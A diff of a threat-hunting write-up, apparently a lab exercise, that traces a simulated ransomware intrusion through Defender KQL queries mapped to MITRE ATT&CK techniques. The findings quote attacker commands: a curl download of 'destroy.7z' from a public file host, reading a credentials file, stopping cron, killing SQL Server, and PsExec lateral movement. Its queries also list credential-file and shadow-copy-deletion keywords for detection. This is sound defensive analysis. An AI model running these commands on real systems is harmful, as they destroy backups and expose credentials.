@@ -128,12 +128,7 @@ _All flags below are collapsible for readability._
 Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.
 
 ### 📌 Finding
-DeviceNetworkEvents
-| where TimeGenerated >= ago(45d)
-| where RemotePort == 22
-| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
-| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
-| order by TimeGenerated asc
+"ssh.exe" backup-admin@10.1.0.189
 
 ### 🔍 Evidence
 
@@ -243,11 +238,13 @@ backup-admin
 This activity aligns with Valid Accounts – Domain Accounts (MITRE ATT&CK T1078.002), where adversaries use legitimate credentials rather than exploiting vulnerabilities. The use of a backup-related administrative account indicates the attacker has already bypassed preventive controls and is operating with trusted access. Compromise of such accounts is especially dangerous because they provide direct access to recovery infrastructure, enabling attackers to disable backups, move laterally with minimal resistance, and significantly increase the impact of ransomware or destructive attacks.
 
 ### 🔧 KQL Query Used
+```
 DeviceNetworkEvents
 | where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
 | where DeviceName == "azuki-adminpc"
 | where RemotePort == 22
 | project TimeGenerated, InitiatingProcessCommandLine
+```
 
 ### 🖼️ Screenshot
 <img width="1543" height="126" alt="image" src="https://github.com/user-attachments/assets/c728035b-715e-4bc6-992d-60dbf46addf8" />
@@ -286,12 +283,14 @@ This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), whe
 When this behavior follows lateral movement into backup infrastructure, it strongly suggests preparation for impact rather than routine administration, and represents one of the final reconnaissance steps before destructive actions.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where TimeGenerated between (datetime(2025-11-25T05:39:11Z) .. datetime(2025-11-25T06:30:00Z))
 | where DeviceName has "azuki-backupsrv"
 | where ProcessCommandLine has_any ("ls ", "dir ", "find ")
 | project TimeGenerated, DeviceName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1517" height="107" alt="image" src="https://github.com/user-attachments/assets/2d66000c-c33c-4fdc-8d2a-1e2dd78641be" />
@@ -330,12 +329,14 @@ This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), whe
 This indicates focused reconnaissance rather than broad exploration, suggesting the attacker is identifying precise targets for deletion or encryption as part of a planned impact phase.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where TimeGenerated between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
 | where DeviceName has "azuki-backupsrv"
 | where AccountName has "" "backup-admin"
 | project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1525" height="199" alt="image" src="https://github.com/user-attachments/assets/c972a0a2-7c18-4ac0-b01c-cc2dc7c23c6d" />
@@ -374,11 +375,13 @@ This activity aligns with Account Discovery (MITRE ATT&CK T1087), where adversar
 On a backup server, this reconnaissance helps the attacker determine which accounts may be leveraged for privilege escalation, credential reuse, or broader lateral movement before executing impact actions.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv"
 | where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
 | where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
 | project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
+```
 
 ### 🖼️ Screenshot
 <img width="772" height="167" alt="image" src="https://github.com/user-attachments/assets/6cfb3235-7ce0-41ed-9303-42e630defe81" />
@@ -417,12 +420,14 @@ This activity aligns with Scheduled Task/Job Discovery (MITRE ATT&CK T1053.003 �
 On a backup server, this reconnaissance helps attackers determine when backups run and how to maximize impact while minimizing detection.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
 | where DeviceName has "azuki-backupsrv"
 | where ProcessCommandLine has "/etc/crontab"
 | project TimeGenerated, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="705" height="130" alt="image" src="https://github.com/user-attachments/assets/d8d9a79b-5020-4704-9aab-f9bfe838e8ae" />
@@ -465,12 +470,14 @@ curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
 This activity aligns with Ingress Tool Transfer (MITRE ATT&CK T1105), where adversaries introduce external tools into the environment to enable later stages of the attack. Backup servers rarely require outbound downloads from public hosting services, making this behavior highly anomalous. When observed after lateral movement and reconnaissance, ingress tool transfer strongly indicates the attacker is transitioning from discovery to impact, leaving limited time for defenders to intervene.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
 | where DeviceName has "azuki-backupsrv"
 | where ProcessCommandLine has_any ("wget ", "curl ", "scp ", "ftp ")
 | project TimeGenerated, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="831" height="81" alt="image" src="https://github.com/user-attachments/assets/68d3c840-8130-4b5a-bea2-29ecc9c256a3" />
@@ -507,12 +514,14 @@ cat /backups/configs/all-credentials.txt
 This activity aligns with Credentials from Password Stores (MITRE ATT&CK T1555). Accessing a file explicitly named to contain credentials indicates the attacker is harvesting secrets rather than merely enumerating the system. On a backup server, exposed credentials often grant access to additional infrastructure, significantly expanding attacker reach and accelerating progression toward full environment compromise.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
 | where DeviceName has "azuki-backupsrv"
 | where ProcessCommandLine has_any ( "password"  "passwd", "credential", "credentials", "cred", "secret","secrets",  "token", "key", "keys",".key" , ".pem", ".pfx", ".pgpass", ".env",".conf", "/etc/passwd","/etc/shadow", "/etc/bacula",".ssh", "id_rsa", "authorized_keys")
 | project TimeGenerated, DeviceName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="653" height="100" alt="image" src="https://github.com/user-attachments/assets/03ac9d9a-7655-4355-a32e-96f999e55560" />
@@ -555,6 +564,7 @@ This activity aligns with Data Destruction (MITRE ATT&CK T1485), where adversari
 Once backup data is removed, defenders lose the ability to restore affected systems, significantly increasing the success and leverage of ransomware or destructive attacks.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
@@ -582,7 +592,7 @@ DeviceProcessEvents
 )
 | project TimeGenerated, DeviceName, AccountName, InitiatingProcessCommandLine, ProcessCommandLine
 | order by TimeGenerated asc
-
+```
 ### 🖼️ Screenshot
 <img width="1527" height="160" alt="image" src="https://github.com/user-attachments/assets/9b45c1bc-d77a-40c2-acdf-770ec63093f6" />
 
@@ -618,6 +628,7 @@ systemctl stop cron
 This aligns with Service Stop (MITRE ATT&CK T1489). Stopping the cron service prevents scheduled jobs such as backups, monitoring, or cleanup tasks from running. In ransomware attacks, this is commonly used to halt backup operations and reduce the chance of recovery or detection.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
@@ -625,7 +636,7 @@ DeviceProcessEvents
     "systemctl stop",  "service ",  "service stop",  "pkill ",  "kill ",  "killall ",    "sv stop",  "rc-service",  "chkconfig", "initctl stop")
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated asc
-
+```
 
 ### 🖼️ Screenshot
 <img width="804" height="163" alt="image" src="https://github.com/user-attachments/assets/5178b54c-a5db-451e-babd-c39cc1c249ac" />
@@ -662,6 +673,7 @@ systemctl disable cron
 This aligns with Service Stop / Modify System Services (MITRE ATT&CK T1489 / T1543). Disabling cron ensures backup and maintenance jobs do not resume, extending the impact beyond the current session and increasing operational disruption.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki-backupsrv"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
@@ -679,6 +691,7 @@ DeviceProcessEvents
 )
 | project TimeGenerated, AccountName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="575" height="106" alt="image" src="https://github.com/user-attachments/assets/2a925017-a324-4fb9-a8b0-39eedd9f413c" />
@@ -715,6 +728,7 @@ PsExec64.exe
 This aligns with Remote Services: SMB/Windows Admin Shares (MITRE ATT&CK T1021.002). PsExec is a legitimate administrative tool frequently abused by attackers to move laterally and execute payloads across multiple hosts quickly.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -722,6 +736,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("\\\\","ADMIN$","IPC$","C$","schtasks","wmic","sc ","psexec","PSEXESVC","at.exe","/node:","process call create")
 | summarize DeviceCount=dcount(DeviceName), Devices=make_set(DeviceName) by FileName, ProcessCommandLine
 | order by DeviceCount desc
+```
 
 ### 🖼️ Screenshot
 <img width="792" height="138" alt="image" src="https://github.com/user-attachments/assets/e0f3dd10-f0b8-4fb3-8d64-b92bac00c095" />
@@ -762,12 +777,14 @@ T1021.002: SMB/Windows Admin Shares
 This aligns with Remote Execution (MITRE ATT&CK T1021). Using PsExec with explicit credentials to copy and execute a binary shows coordinated lateral deployment of malicious tooling.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where FileName =~ "PsExec64.exe"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />
@@ -804,12 +821,14 @@ silentlynx.exe
 This aligns with User Execution / Malicious File Execution (MITRE ATT&CK T1204 / T1059). Execution of a non-standard binary deployed via PsExec strongly indicates attacker-controlled payload execution as part of the impact phase.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where FileName =~ "PsExec64.exe"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />
@@ -845,6 +864,7 @@ Ransomware stops backup services to prevent recovery during encryption. Disable 
 This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping VSS removes a common recovery mechanism, significantly increasing ransomware effectiveness.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -852,6 +872,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("VSS","Shadow","Volume")
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="927" height="167" alt="image" src="https://github.com/user-attachments/assets/630ac85f-1500-47ec-96e9-2526c9626149" />
@@ -888,6 +909,7 @@ Stop Windows backup services to prevent the creation or restoration of backups.
 This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping the Windows Backup Engine further ensures recovery options are eliminated.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -895,6 +917,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has "wbengine"
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="985" height="166" alt="image" src="https://github.com/user-attachments/assets/2b180578-483e-4749-a57a-eebf14d28580" />
@@ -931,12 +954,14 @@ taskkill /F /IM sqlservr.exe
 This aligns with Process Termination (MITRE ATT&CK T1562.001 / T1489). Stopping database processes ensures files are unlocked and prevents application-level recovery during ransomware execution.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T05:55:00Z)..datetime(2025-11-25T06:10:00Z))
 | where FileName == "taskkill.exe"
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="949" height="133" alt="image" src="https://github.com/user-attachments/assets/70dcd8e3-4568-4660-a558-bd6f9ba3999b" />
@@ -974,12 +999,14 @@ Alert on forced termination of critical services such as databases or security t
 This activity aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Deleting Volume Shadow Copies removes one of the most common Windows recovery mechanisms, preventing rollback or file restoration after encryption. This is a well-known ransomware tactic and strongly indicates the attack has entered the irreversible impact phase.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1053" height="167" alt="image" src="https://github.com/user-attachments/assets/1acf40a9-75c8-4097-9c59-c413c140ae90" />
@@ -1016,13 +1043,14 @@ Alert immediately on vssadmin shadow deletion commands, especially when executed
 This activity aligns with Inhibit System Recovery (MITRE ATT&CK T1490). By drastically limiting shadow copy storage, the attacker ensures that new restore points cannot be created and existing ones may be deleted or overwritten. This weakens the organization’s ability to recover systems after encryption and is commonly used in ransomware attacks to guarantee recovery mechanisms remain unavailable even if backups attempt to run again.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
 | order by TimeGenerated asc
-
+```
 
 ### 🖼️ Screenshot
 <img width="676" height="157" alt="image" src="https://github.com/user-attachments/assets/69c9de16-3060-490e-8ba5-00281e2125d5" />
@@ -1059,6 +1087,7 @@ Disable Windows recovery options permanently. Windows recovery features enable a
 This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Disabling recovery prevents systems from booting into repair or rollback modes, making post-incident remediation significantly more difficult.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -1066,6 +1095,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has "recoveryenabled"
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="541" height="131" alt="image" src="https://github.com/user-attachments/assets/d369ed75-b945-4297-9a09-d56276754ff1" />
@@ -1103,6 +1133,7 @@ Destroy backup metadata to prevent restoration. Backup catalogues track availabl
 This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Deleting the backup catalog removes the system’s ability to identify or restore backups, even if backup files still exist.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -1110,6 +1141,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has "delete catalog"
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="502" height="135" alt="image" src="https://github.com/user-attachments/assets/5f530429-4271-42fa-92bb-ae06f18a772f" />
@@ -1148,12 +1180,14 @@ WindowsSecurityHealth
 This activity aligns with Boot or Logon Autostart Execution: Registry Run Keys (MITRE ATT&CK T1547.001). By creating a registry autorun entry that masquerades as a legitimate Windows component (WindowsSecurityHealth), the attacker ensures their payload will execute on every logon while blending into normal system behavior. This allows the attacker to maintain access and re-establish execution even after reboots or partial remediation.
 
 ### 🔧 KQL Query Used
+```
 DeviceRegistryEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | where RegistryKey has @"\Run"
 | project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="847" height="133" alt="image" src="https://github.com/user-attachments/assets/788bde3c-f283-4af0-bb55-c9fc7bd6f46e" />
@@ -1190,11 +1224,13 @@ Scheduled jobs provide reliable persistence with configurable triggers. Ensure m
 This aligns with Scheduled Task/Job (MITRE ATT&CK T1053.005). Creating a scheduled task provides reliable persistence and execution with high privileges, commonly used by ransomware families.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
 | where ProcessCommandLine has @"Microsoft\Windows\Security\SecurityHealthService"
 | project TimeGenerated, DeviceName, ProcessCommandLine
+```
 
 ### 🖼️ Screenshot
 <img width="1194" height="99" alt="image" src="https://github.com/user-attachments/assets/5a2691a1-e32b-43eb-80d4-e8ade0e7c95c" />
@@ -1231,6 +1267,7 @@ Remove forensic artifacts and hinder recovery. File system journals track change
 This activity aligns with Indicator Removal on Host (MITRE ATT&CK T1070). Deleting the USN journal removes a key forensic data source used to track file creation, modification, and deletion. This hinders post-incident investigation, obscures attacker activity, and complicates recovery analysis. In ransomware intrusions, journal deletion is commonly used to reduce defender visibility after impact actions have begun.
 
 ### 🔧 KQL Query Used
+```
 DeviceProcessEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
@@ -1238,6 +1275,7 @@ DeviceProcessEvents
 | where ProcessCommandLine has "deletejournal"
 | project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="801" height="150" alt="image" src="https://github.com/user-attachments/assets/9c14f007-8212-4d9f-8c0d-0583bf4ace64" />
@@ -1278,12 +1316,14 @@ SILENTLYNX_README.txt
 This activity aligns with Data Encrypted for Impact (MITRE ATT&CK T1486). The creation of a ransom note confirms that the attacker has completed the primary destructive actions and is transitioning to extortion. At this stage, recovery options have already been intentionally degraded or eliminated, and the attacker’s goal is no longer access or disruption but coercion. Detection here indicates the attack has reached its terminal phase.
 
 ### 🔧 KQL Query Used
+```
 DeviceFileEvents
 | where DeviceName has "azuki"
 | where TimeGenerated between (datetime(2025-11-20T00:00:00Z)..datetime(2025-12-04T23:59:59Z))
 | where FileName endswith ".txt"
 | project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
 | order by TimeGenerated asc
+```
 
 ### 🖼️ Screenshot
 <img width="1538" height="279" alt="image" src="https://github.com/user-attachments/assets/14be10cd-b157-4612-bcc1-e71fde8b143f" />
